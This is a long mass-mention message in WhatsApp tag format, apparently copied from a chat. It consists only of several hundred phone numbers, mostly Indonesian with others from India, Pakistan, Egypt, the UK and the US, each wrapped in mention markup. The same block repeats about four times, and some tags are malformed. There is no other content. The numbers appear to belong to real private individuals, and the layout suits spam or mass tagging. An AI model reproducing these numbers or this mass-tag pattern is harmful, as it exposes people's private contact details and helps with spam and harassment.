~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ 